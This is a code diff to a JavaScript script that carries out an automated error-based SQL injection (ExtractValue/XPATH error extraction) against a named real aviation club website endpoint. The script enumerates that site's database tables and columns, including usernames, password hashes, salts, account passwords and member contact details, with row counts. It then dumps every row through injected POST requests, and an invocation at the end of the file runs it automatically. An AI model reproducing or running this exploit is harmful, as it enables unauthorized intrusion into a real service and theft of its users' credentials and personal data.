@@ -12,68 +12,115 @@ if( !Math.rndRange ){
         return Math.random()*((max-min)+1)+min;
     }
 }
-var oScrapeAC = {};
-var aTables    = ["CHARACTER_SETS", "COLLATIONS", "COLLATION_CHARACTER_SET_APPLICA", "COLUMNS", "COLUMN_PRIVILEGES", "ENGINES", "EVENTS", "FILES", "GLOBAL_STATUS", "GLOBAL_VARIABLES", "KEY_COLUMN_USAGE", "PARTITIONS", "PLUGINS", "PROCESSLIST", "PROFILING", "REFERENTIAL_CONSTRAINTS", "ROUTINES", "SCHEMATA", "SCHEMA_PRIVILEGES", "SESSION_STATUS", "SESSION_VARIABLES", "STATISTICS", "TABLES", "TABLE_CONSTRAINTS", "TABLE_PRIVILEGES", "TRIGGERS", "USER_PRIVILEGES", "VIEWS", "account", "account_transaction", "aircraft", "aircraft_file", "aircraft_maintenance", "aircraft_photo", "aircraftpricing", "aircrafttype", "aircraftusage", "airport", "banner", "booking", "bookingequipment", "bounceAddress", "cancelreason", "closed_banner", "club", "clublocations", "email_send_log", "email_send_queue", "equipment", "file", "filetype", "flightlog", "flightreconlog", "formatpattern", "freq", "ics_send_log", "ics_send_queue", "invoice", "invoice_line", "link", "maintenanceitem", "migrateStaging", "news", "permission", "permissiongroup", "person", "person_aircraft", "person_aircraft_email", "person_aircraft_notify", "person_equipment", "person_newsread", "person_role", "pricing", "pricinginterval", "role", "role_permission", "sharetype", "squawk", "status", "subscriptionplan", "systemconfig", "terms", "timezone"],
-    aColSubset = [ "account", "file", "filetype", "invoice", "invoice_line", "permission", "permissiongroup", "person", "person_role", "role", "role_permission", "subscriptionplan", "systemconfig"],
-    oTableCols = {"account":["ID","ClubID","PlanID","SubscriptionID","CancelledSubscriptionID","StartDate","ExpirationDate","Inactive","LoginOverride","MaintenanceOverride","AccountingOverride","Reminder1Sent","Reminder2Sent","PriceOverride","PaymentMethod","PaymentAccount","PaymentAmount","PayDay","SubscriptionStart","ExpirationEmailSent"],"file":["ID","Title","Description","FileTypeID","FileURL","FileName","Server","CreatorID","CreationDate","ClubID","LastModifiedDate","ModifierID","StatusID","Sort"],"filetype":["ID","Name"],"invoice":["ID","Key","ClubID","Date","Paid","AmountPaid","TransactionID","PaymentMethod","PaymentAccount","PaymentDate","EmailSent","Discount"],"invoice_line":["ID","InvoiceID","Description","Amount","RefID"],"permission":["ID","Name","Description","PermissionGroupID"],"permissiongroup":["ID","Name"],"person":["ID","ClubID","Username","Password","Salt","FirstName","LastName","Email","SecondaryEmail","TertiaryEmail","Phone","WorkPhone","Mobile","Address","City","State","Country","PostalCode","DOB","ProfilePicID","DefaultAircraftID","DefaultInstructorID","DefaultEquipmentID","DisplayContactInfo","ReservationReminder","ReservationCalendarInvites","StartAtHome","CertificateNumber","CertificateDate","MedicalDate","MedicalReminder","BiennialFlightReviewDate","BiennialFlightReviewReminder","ClubReviewDate","ClubReviewReminder","AOPANumber","EAANumber","RegistrationDate","LastAccessDate","LastModifiedDate","ModifierID","CreatorID","CreationDate","IsImported","AdminNotes","LockoutText","Active","ActivationCode","ActivationDate","SingleEngineLand","SingleEngineSea","SingleEngineInstrument","MultiEngineLand","MultiEngineSea","MultiEngineInstrument","LegacySystemResourceID","LegacySystemID","ActivationIP","TermsID","StatusID","ShowFirstTimePopup","RecieveClubWideNotifications","EmergencyPhone","EmergencyContact","ACC_NNUMBER","ACC_PASSWORD","Instructor","InstructorRating","LocationID","External","InstructorNotes","InstructorSort"],"person_role":["PersonID","RoleID"],"role":["ID","Name","Description","ClubID","ReadOnly"],"role_permission":["RoleID","PermissionID"],"subscriptionplan":["ID","Name","Includes_scheduling","Includes_maintenance","Includes_accounting","Active"],"systemconfig":["ID","LogDbCalls","SendEmail"], "club":["ID", "Name", "PhoneNumber", "RepresentativeID", "TreasurerID", "MaintenancePersonID", "SecretaryID", "Website", "Address", "City", "State", "Country", "PostalCode", "LogoFileID", "DateRegistered", "Active", "ActivationCode", "ICAOCode", "TimezoneID", "DateFormatID", "TimeFormatID", "ModifierID", "LastModifiedDate", "RuleDaysIntoFuture", "RuleMaxReservations", "RuleMaxWeekendReservations", "RuleMaxReservationHours", "RuleMaxLengthOfReservation", "RuleAllowCheckout", "RuleAllowEditFlightMedical", "RuleAllowEmail", "MaintenanceUsageWindow", "RuleIgnoreForSameDay", "RuleCurrencyOverride", "RuleRequireComments", "LegacyID", "Nnumber", "MeasureUnitID", "RuleBFRSuspendDays", "RuleMedicalSuspendDays", "RuleCFRSuspendDays", "RuleSchedulingCutOff", "RuleSchedulingOverride", "Source"]},
-    oTableData = {};
 
-            errorInject2:{ 
-                main:" ExtractValue(null,substr({query} limit {start},1),{subS},{subE})) = 1 ",
-                pbp : "SELECT CONCAT({column_list}) FROM {table} WHERE {where}"
-            }
+var baseURL      = 'https://www.aircraftclubs.com/functions/aircraft/getAircraft.php',
+    oScrapeAC    = {},
+    aTables      = ["CHARACTER_SETS", "COLLATIONS", "COLLATION_CHARACTER_SET_APPLICA", "COLUMNS", "COLUMN_PRIVILEGES", "ENGINES", "EVENTS", "FILES", "GLOBAL_STATUS", "GLOBAL_VARIABLES", "KEY_COLUMN_USAGE", "PARTITIONS", "PLUGINS", "PROCESSLIST", "PROFILING", "REFERENTIAL_CONSTRAINTS", "ROUTINES", "SCHEMATA", "SCHEMA_PRIVILEGES", "SESSION_STATUS", "SESSION_VARIABLES", "STATISTICS", "TABLES", "TABLE_CONSTRAINTS", "TABLE_PRIVILEGES", "TRIGGERS", "USER_PRIVILEGES", "VIEWS", "account", "account_transaction", "aircraft", "aircraft_file", "aircraft_maintenance", "aircraft_photo", "aircraftpricing", "aircrafttype", "aircraftusage", "airport", "banner", "booking", "bookingequipment", "bounceAddress", "cancelreason", "closed_banner", "club", "clublocations", "email_send_log", "email_send_queue", "equipment", "file", "filetype", "flightlog", "flightreconlog", "formatpattern", "freq", "ics_send_log", "ics_send_queue", "invoice", "invoice_line", "link", "maintenanceitem", "migrateStaging", "news", "permission", "permissiongroup", "person", "person_aircraft", "person_aircraft_email", "person_aircraft_notify", "person_equipment", "person_newsread", "person_role", "pricing", "pricinginterval", "role", "role_permission", "sharetype", "squawk", "status", "subscriptionplan", "systemconfig", "terms", "timezone"],
+    aColSubset   = [ "account", "file", "filetype", "invoice", "invoice_line", "permission", "permissiongroup", "person", "person_role", "role", "role_permission", "subscriptionplan", "systemconfig"],
+    oTableCols   = {"account":["ID","ClubID","PlanID","SubscriptionID","CancelledSubscriptionID","StartDate","ExpirationDate","Inactive","LoginOverride","MaintenanceOverride","AccountingOverride","Reminder1Sent","Reminder2Sent","PriceOverride","PaymentMethod","PaymentAccount","PaymentAmount","PayDay","SubscriptionStart","ExpirationEmailSent"],"file":["ID","Title","Description","FileTypeID","FileURL","FileName","Server","CreatorID","CreationDate","ClubID","LastModifiedDate","ModifierID","StatusID","Sort"],"filetype":["ID","Name"],"invoice":["ID","Key","ClubID","Date","Paid","AmountPaid","TransactionID","PaymentMethod","PaymentAccount","PaymentDate","EmailSent","Discount"],"invoice_line":["ID","InvoiceID","Description","Amount","RefID"],"permission":["ID","Name","Description","PermissionGroupID"],"permissiongroup":["ID","Name"],"person":["ID","ClubID","Username","Password","Salt","FirstName","LastName","Email","SecondaryEmail","TertiaryEmail","Phone","WorkPhone","Mobile","Address","City","State","Country","PostalCode","DOB","ProfilePicID","DefaultAircraftID","DefaultInstructorID","DefaultEquipmentID","DisplayContactInfo","ReservationReminder","ReservationCalendarInvites","StartAtHome","CertificateNumber","CertificateDate","MedicalDate","MedicalReminder","BiennialFlightReviewDate","BiennialFlightReviewReminder","ClubReviewDate","ClubReviewReminder","AOPANumber","EAANumber","RegistrationDate","LastAccessDate","LastModifiedDate","ModifierID","CreatorID","CreationDate","IsImported","AdminNotes","LockoutText","Active","ActivationCode","ActivationDate","SingleEngineLand","SingleEngineSea","SingleEngineInstrument","MultiEngineLand","MultiEngineSea","MultiEngineInstrument","LegacySystemResourceID","LegacySystemID","ActivationIP","TermsID","StatusID","ShowFirstTimePopup","RecieveClubWideNotifications","EmergencyPhone","EmergencyContact","ACC_NNUMBER","ACC_PASSWORD","Instructor","InstructorRating","LocationID","External","InstructorNotes","InstructorSort"],"person_role":["PersonID","RoleID"],"role":["ID","Name","Description","ClubID","ReadOnly"],"role_permission":["RoleID","PermissionID"],"subscriptionplan":["ID","Name","Includes_scheduling","Includes_maintenance","Includes_accounting","Active"],"systemconfig":["ID","LogDbCalls","SendEmail"], "club":["ID", "Name", "PhoneNumber", "RepresentativeID", "TreasurerID", "MaintenancePersonID", "SecretaryID", "Website", "Address", "City", "State", "Country", "PostalCode", "LogoFileID", "DateRegistered", "Active", "ActivationCode", "ICAOCode", "TimezoneID", "DateFormatID", "TimeFormatID", "ModifierID", "LastModifiedDate", "RuleDaysIntoFuture", "RuleMaxReservations", "RuleMaxWeekendReservations", "RuleMaxReservationHours", "RuleMaxLengthOfReservation", "RuleAllowCheckout", "RuleAllowEditFlightMedical", "RuleAllowEmail", "MaintenanceUsageWindow", "RuleIgnoreForSameDay", "RuleCurrencyOverride", "RuleRequireComments", "LegacyID", "Nnumber", "MeasureUnitID", "RuleBFRSuspendDays", "RuleMedicalSuspendDays", "RuleCFRSuspendDays", "RuleSchedulingCutOff", "RuleSchedulingOverride", "Source"]},
+    oTableCols2  = {"account":{"columns":["ID","ClubID","PlanID","SubscriptionID","CancelledSubscriptionID","StartDate","ExpirationDate","Inactive","LoginOverride","MaintenanceOverride","AccountingOverride","Reminder1Sent","Reminder2Sent","PriceOverride","PaymentMethod","PaymentAccount","PaymentAmount","PayDay","SubscriptionStart","ExpirationEmailSent"],"nRowCnt":"1047"},"file":{"columns":["ID","Title","Description","FileTypeID","FileURL","FileName","Server","CreatorID","CreationDate","ClubID","LastModifiedDate","ModifierID","StatusID","Sort"],"nRowCnt":"14020"},"filetype":{"columns":["ID","Name"],"nRowCnt":"9"},"invoice":{"columns":["ID","Key","ClubID","Date","Paid","AmountPaid","TransactionID","PaymentMethod","PaymentAccount","PaymentDate","EmailSent","Discount"],"nRowCnt":"37"},"invoice_line":{"columns":["ID","InvoiceID","Description","Amount","RefID"],"nRowCnt":"102"},"permission":{"columns":["ID","Name","Description","PermissionGroupID"],"nRowCnt":"22"},"permissiongroup":{"columns":["ID","Name"],"nRowCnt":"6"},"person":{"columns":["ID","ClubID","Username","Password","Salt","FirstName","LastName","Email","SecondaryEmail","TertiaryEmail","Phone","WorkPhone","Mobile","Address","City","State","Country","PostalCode","DOB","ProfilePicID","DefaultAircraftID","DefaultInstructorID","DefaultEquipmentID","DisplayContactInfo","ReservationReminder","ReservationCalendarInvites","StartAtHome","CertificateNumber","CertificateDate","MedicalDate","MedicalReminder","BiennialFlightReviewDate","BiennialFlightReviewReminder","ClubReviewDate","ClubReviewReminder","AOPANumber","EAANumber","RegistrationDate","LastAccessDate","LastModifiedDate","ModifierID","CreatorID","CreationDate","IsImported","AdminNotes","LockoutText","Active","ActivationCode","ActivationDate","SingleEngineLand","SingleEngineSea","SingleEngineInstrument","MultiEngineLand","MultiEngineSea","MultiEngineInstrument","LegacySystemResourceID","LegacySystemID","ActivationIP","TermsID","StatusID","ShowFirstTimePopup","RecieveClubWideNotifications","EmergencyPhone","EmergencyContact","ACC_NNUMBER","ACC_PASSWORD","Instructor","InstructorRating","LocationID","External","InstructorNotes","InstructorSort"],"nRowCnt":"28056"},"person_role":{"columns":["PersonID","RoleID"],"nRowCnt":"17718"},"role":{"columns":["ID","Name","Description","ClubID","ReadOnly"],"nRowCnt":"6"},"role_permission":{"columns":["RoleID","PermissionID"],"nRowCnt":"41"},"subscriptionplan":{"columns":["ID","Name","Includes_scheduling","Includes_maintenance","Includes_accounting","Active"],"nRowCnt":"3"},"systemconfig":{"columns":["ID","LogDbCalls","SendEmail"],"nRowCnt":"1"},"club":{"columns":["ID","Name","PhoneNumber","RepresentativeID","TreasurerID","MaintenancePersonID","SecretaryID","Website","Address","City","State","Country","PostalCode","LogoFileID","DateRegistered","Active","ActivationCode","ICAOCode","TimezoneID","DateFormatID","TimeFormatID","ModifierID","LastModifiedDate","RuleDaysIntoFuture","RuleMaxReservations","RuleMaxWeekendReservations","RuleMaxReservationHours","RuleMaxLengthOfReservation","RuleAllowCheckout","RuleAllowEditFlightMedical","RuleAllowEmail","MaintenanceUsageWindow","RuleIgnoreForSameDay","RuleCurrencyOverride","RuleRequireComments","LegacyID","Nnumber","MeasureUnitID","RuleBFRSuspendDays","RuleMedicalSuspendDays","RuleCFRSuspendDays","RuleSchedulingCutOff","RuleSchedulingOverride","Source"],"nRowCnt":"1046"}},
+    oTableData   = {},
+    errorInject2 = { 
+        main :" ExtractValue(null,concat(0x3a,substr(({query} limit {start},1),{subS},{subE}))) = 1 ",
+        pbp  : "SELECT CONCAT({column_list}) FROM {table} WHERE {where}",
+        pbp2 : "SELECT {column_list} FROM {table} ",
+        pbp3 : "SELECT CONCAT({column_list}) FROM {table} "
+    };
 
 (function(oScrapeAC){
-    var aTables = Object.getOwnPropertyNames(oTableCols);
+    var aTables = Object.getOwnPropertyNames(oTableCols2);
 
-    function loopAllTables( nTable ){
-        var sTable   = oTableCols[aTables[nTable]],
-            deffered = Q.defer();
-        loopAllRows( sTable, 0 ).then( function(){
-            nTable++;
-            if( nTable < aTables.length ){
-                loopAllTables( nTable+1 );
-            }else{
-                deffered.resolve();
+    function run(){
+        var deffered = Q.defer();
+
+        loopAllTables( 0, {} ).then( 
+            function(o){
+                console.log(o);
+                console.log( JSON.stringify(o) );
+                deffered.resolve(o);
+            },
+            function(e){
+                debugger;
+                console.log(e);
+                deffered.reject(e);
             }
-        }).done();
-        return deffered.promis;
-    }
-    function loopAllRows( sTable, nRow ){//Does nothing but keep a count of rows.
-        var aCols    = oTableCols[sTable],
-            deferred = Q.defer();
-
-        loopAllColumns( sTable, aCols, 0, nRow ).then(function(){
-            if( nRow < oTableRowCnt[sTable] ){
-            }else{
-                deferred.resolve();
-            }
-        }).done();
-
-        return deferred.promise;
-    }
-    function loopAllColumns( sTable, aCols, nCol, nRow ){
-        var sCol     = aCols[nCol],
-            deffered = Q.defer();
-         
-        if( nCol < aCols.length ){
-            loopAllColumns( sTable, aCols, nCol+1, nRow );
-        }else{
-            deffered.resolve();
-        }
+        ).done();
         return deffered.promise;
     }
 
-    function query( strInject, pos ){
-        var str = strInject.supplant({start:pos+''}),
+    function loopAllTables( nTable, oTableData ){
+        var sTable   = aTables[nTable],
             deffered = Q.defer();
+
+        loopAllRows( sTable, 0, oTableData ).then( function(){
+            nTable++;
+            if( nTable < aTables.length ){
+                loopAllTables( nTable+1, oTableData );
+            }else{
+                deffered.resolve( oTableData );
+            }
+        }).done();
+        return deffered.promise;
+    }
+
+    //Does nothing but keep a count of rows.
+    function loopAllRows( sTable, nRow, oTableData ){
+        var aCols    = oTableCols2[sTable].columns,
+            deferred = Q.defer();
+
+        loopAllColumns( sTable, aCols, 0, nRow, oTableData ).then(
+            function(){
+                if( nRow < oTableCols2[sTable].nRowCnt ){
+                    loopAllRows( sTable, nRow+1, oTableData );
+                }else{
+                    deferred.resolve();
+                }
+            },
+            function( o ){
+                deferred.reject(o);
+            }
+        ).done();
+
+        return deferred.promise;
+    }
+    function loopAllColumns( sTable, aCols, nCol, nRow, oTableData ){
+        var sCol     = aCols[nCol],
+            deffered = Q.defer(),
+            pbp      = errorInject2.pbp2.supplant({column_list:sCol, table:sTable }),
+            sQuery   = errorInject2.main.supplant({query:pbp,start:nRow+'', subS:'1', subE:'32'});
+        
+        query( sQuery ).then(
+            function(data){
+                debugger;
+                var data = processData(data);
+                if( data ){
+                    if( oTableData[sTable] ){//TODO: needs to be an array of arrays outer array is the row
+                        oTableData[sTable].push(data);
+                    }else{
+                        oTableData[sTable] = [data];
+                    }
+                }
+                if( nCol < aCols.length ){
+                    loopAllColumns( sTable, aCols, nCol+1, nRow, oTableData );
+                }else{
+                    deffered.resolve();
+                }
+            },
+            function(o){
+                deffered.reject(o);
+            }
+        ).done();
+        return deffered.promise;
+    }
+
+    function query( strInject ){
+        var deffered = Q.defer();
 
         $.ajax({
             url:baseURL,
             method:'POST',
-            context:this,
             data:{
-                id:str,
+                id:strInject,
                 a:'v'
             },
             success:function( data, textStatus, jqXHR ){
@@ -84,7 +131,26 @@ var aTables    = ["CHARACTER_SETS", "COLLATIONS", "COLLATION_CHARACTER_SET_APPLI
                 debugger;
             }
         });
+
+        return deffered.promise;
     };
+
+    function processData( s ){
+        var reg = /'(.+)'/;
+
+        if( s.indexOf('XPATH syntax error') == -1 ){
+            return undefined;
+        }
+        var ss  = reg.exec(s),
+            data = '';
+        if( ss && ss.length ){
+            data = ss[1].substring(1);
+            return data;
+        }
+        return undefined;
+    }
+
+    oScrapeAC.allData = run;
 })(oScrapeAC);
 
 (function(oScrapeAC){
@@ -350,7 +416,7 @@ function loopAllRows( oTablesCols, aTables, curIndex ){
         console.log( JSON.stringify(oTableData) );
     }
 }
-loopAllRows( oTableCols, Object.getOwnPropertyNames(oTableCols), 0 );
+//loopAllRows( oTableCols, Object.getOwnPropertyNames(oTableCols), 0 );
 
 
 
@@ -2406,3 +2472,14 @@ var qEndingLine = captureLine();
 return Q;
 
 });
+
+/* ============================================================================================ */
+oScrapeAC.allData().then(
+    function(o){
+        console.log(o);
+        console.log(JSON.stringify(o));
+    },
+    function(e){
+        debugger;
+    }
+).done();
